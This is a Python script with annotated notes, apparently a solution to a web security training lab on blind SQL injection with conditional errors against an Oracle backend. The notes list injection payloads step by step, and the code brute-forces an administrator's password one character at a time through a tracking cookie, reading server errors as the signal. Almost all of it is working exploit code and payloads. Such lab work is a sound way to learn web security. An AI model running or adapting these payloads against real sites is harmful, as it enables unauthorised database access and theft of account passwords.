# Blind SQL injection with conditional errors
"""
    1. Prove that parameter is vulnerable to SQL injection
    ' || (select '') || '  => e
    ' || (select '' from dual) || '  => not e => oracle
    ' || (select '' from dualfbfhjf) || '  => e 

    2. Confirm that the users table exits in the database
    ' || (select '' from users where rownum = 1) || '  => not e 

    3. Confirm that the administrator user exists in the users database
    ' || (select '' from users where username = 'administrator') || '

    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from dual) || '

    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username = 'administrator') || '  
    where xong (có data) rồi mới select 
    where sai thì k thực hiện select 
    -> Internal server error -> administrator user exist 

    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username = 'fgdhd') || '
    -> 200 -> user does not exist in database 
    
    4.Determine length of password 
    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username = 'administrator' and LENGTH(password)=20) || '

    5. Output the administrator password
    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username = 'administrator' and SUBSTR(password,1,1)='a') || '
"""
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import urllib

proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080' }

# url = 'https://0a61004303029a0581ef7a0800ed006c.web-security-academy.net/'

def sqli_password(url):
    password_extracted = ""
    for i in range (1,21):
        for j in range (32,126):
            sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username = 'administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId':'SQxdjQIJ1BWHtDtW' + sqli_payload_encoded,
                      'session': 'sErg2hb8ecldkeHUTaKTfrghpsYM2pMF'
                      }
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r'+ password_extracted)
                sys.stdout.flush()
                break                
            else:
                sys.stdout.write('\r'+ password_extracted + chr(j))
                sys.stdout.flush()
                
def main(): 
    if len(sys.argv) != 2:
        print ("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
    url = sys.argv[1]
    print("[+] Retrieving administrator password...")
    sqli_password(url)
    
if __name__ == '__main__':
    main()
    